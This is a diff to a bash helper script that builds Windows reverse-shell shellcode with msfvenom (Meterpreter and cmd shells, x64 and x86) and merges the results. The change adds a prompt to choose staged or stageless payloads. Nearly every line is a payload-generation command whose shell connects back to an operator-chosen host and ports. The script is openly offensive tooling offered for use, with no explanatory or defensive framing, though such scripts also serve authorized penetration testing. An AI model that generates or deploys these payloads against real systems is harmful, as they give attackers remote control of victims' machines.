@@ -27,28 +27,67 @@ then
     read cmd
     if [[ $cmd -eq 0 ]]
     then
-        echo Generating x64 meterpreter shell...
-        echo
-	echo msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-	msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-        echo 
-        echo Generating x86 meterpreter shell...
-        echo
-	echo msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-	msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
+        read cmd
+        if [[ $cmd -eq 0 ]]
+        then
+            echo Generating x64 meterpreter shell \(staged\)...
+            echo
+            echo msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
+            msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
+            echo 
+            echo Generating x86 meterpreter shell \(staged\)...
+            echo
+            echo msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+            msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+        elif [[ $cmd -eq 1 ]]
+        then
+            echo Generating x64 meterpreter shell \(stageless\)...
+            echo
+            echo msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
+            msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
+            echo 
+            echo Generating x86 meterpreter shell \(stageless\)...
+            echo
+            echo msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+            msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+        else
+            echo Invalid option...exiting...
+            exit 1
+        fi
     elif [[ $cmd -eq 1 ]]
     then
-        echo Generating x64 cmd shell...
-        echo
-        echo msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-        msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
-        echo
-        echo Generating x86 cmd shell...
-        echo
-        echo msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
-        msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
+        read cmd
+        if [[ $cmd -eq 0 ]]
+        then
+            echo Generating x64 cmd shell \(staged\)...
+            echo
+            echo msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
+            msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
+            echo
+            echo Generating x86 cmd shell \(staged\)...
+            echo
+            echo msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+            msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+        elif [[ $cmd -eq 1 ]]
+        then
+            echo Generating x64 cmd shell \(stageless\)...
+            echo
+            echo msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
+            msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
+            echo
+            echo Generating x86 cmd shell \(stageless\)...
+            echo
+            echo msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+            msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
+        else
+            echo Invalid option...exiting...
+            exit 1
+        fi
     else
         echo Invalid option...exiting...
+        exit 1
     fi
 echo
 echo MERGING SHELLCODE WOOOO!!!
@@ -59,3 +98,4 @@ else
     echo Okay cool, make sure you merge your own shellcode properly :\)
 fi
 echo DONE
+exit 0
